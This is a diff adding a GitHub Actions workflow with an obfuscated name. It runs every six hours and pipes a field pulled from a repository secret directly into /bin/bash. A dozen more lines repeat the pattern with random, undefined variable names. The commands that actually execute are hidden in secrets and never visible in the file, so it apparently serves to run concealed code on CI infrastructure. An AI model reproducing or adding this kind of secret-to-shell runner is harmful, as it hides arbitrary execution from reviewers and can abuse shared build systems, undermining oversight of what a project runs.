@@ -1,0 +1,30 @@
+name: aigongmuhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: aigongmuhe
+        env:
+          n8: ${{ secrets.n8 }}
+        run: |
+          echo $n8 | jq -r .jbnb64929 | /bin/bash
+          echo $gg04070 | jq -r .ht040 | /bin/bash
+          echo $jufec26 | jq -r .p7 | /bin/bash
+          echo $oa1 | jq -r .y662 | /bin/bash
+          echo $oun313 | jq -r .vgy82435 | /bin/bash
+          echo $zl21 | jq -r .zco6 | /bin/bash
+          echo $j35 | jq -r .jnh14 | /bin/bash
+          echo $us764 | jq -r .qnza777 | /bin/bash
+          echo $qjlbl014 | jq -r .xzumk1 | /bin/bash
+          echo $lbpbo38985 | jq -r .vvd8199 | /bin/bash
+          echo $f57815 | jq -r .j4692 | /bin/bash
+          echo $gdcd98 | jq -r .edky9164 | /bin/bash
+          echo $ielgy067 | jq -r .ikhq5 | /bin/bash
+
